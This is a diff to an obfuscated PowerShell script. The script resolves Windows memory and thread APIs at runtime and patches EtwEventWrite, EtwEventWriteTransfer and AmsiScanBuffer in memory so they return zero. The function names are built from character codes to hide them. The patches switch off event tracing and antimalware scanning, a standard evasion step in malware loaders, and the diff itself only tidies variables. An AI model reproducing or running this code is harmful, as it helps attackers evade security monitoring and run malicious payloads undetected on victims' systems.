@@ -77,6 +77,8 @@ $Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([Strin
 $Fld=[System.Reflection.FieldInfo[]]@([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
 $Val=[Object[]]@($True)
 $ka=@($k+$kb)
+$u32ref=[UInt32].MakeByRefType()
+$uptr6=New-Object UIntPtr(6)
 
 $m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
 $m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
@@ -84,11 +86,11 @@ $m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
 $m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
 $m2=$Tb.DefineMethod('VA','Public,Static',[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32]))
 $m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
-$m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType()))
+$m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],$u32ref))
 $m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
 $m4=$Tb.DefineMethod('VF','Public,Static',[bool],@([IntPtr],[UInt32],[UInt32]))
 $m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
-$m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[UInt32].MakeByRefType()))
+$m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],$u32ref))
 $m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
 $m6=$Tb.DefineMethod('WF','Public,Static',[UInt32],@([IntPtr],[UInt32]))
 $m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
@@ -104,15 +106,15 @@ function _p0 {
         [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
         $ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
         if ($ew -ne [IntPtr]::Zero) {
-            $o=[UInt32]0;$W::VP($ew,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
+            $o=[UInt32]0;$W::VP($ew,$uptr6,0x40,[ref]$o)|Out-Null
             [Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6)
-            $W::VP($ew,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
+            $W::VP($ew,$uptr6,$o,[ref]$o)|Out-Null
         }
         $ewt=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101+[char]84+[char]114+[char]97+[char]110+[char]115+[char]102+[char]101+[char]114)
         if ($ewt -ne [IntPtr]::Zero) {
-            $o=[UInt32]0;$W::VP($ewt,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
+            $o=[UInt32]0;$W::VP($ewt,$uptr6,0x40,[ref]$o)|Out-Null
             [Runtime.InteropServices.Marshal]::Copy($p6,0,$ewt,6)
-            $W::VP($ewt,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
+            $W::VP($ewt,$uptr6,$o,[ref]$o)|Out-Null
         }
         _log "S0: p0 ok"
         return $true
@@ -128,9 +130,9 @@ function _p1 {
         $sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114)
         if ($sb -eq [IntPtr]::Zero) { return $false }
         [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
-        $o=[UInt32]0;$W::VP($sb,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
+        $o=[UInt32]0;$W::VP($sb,$uptr6,0x40,[ref]$o)|Out-Null
         [Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6)
-        $W::VP($sb,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
+        $W::VP($sb,$uptr6,$o,[ref]$o)|Out-Null
         _log "S0: p1 ok"
         return $true
     } catch { _log "S0: p1 err"; return $false }
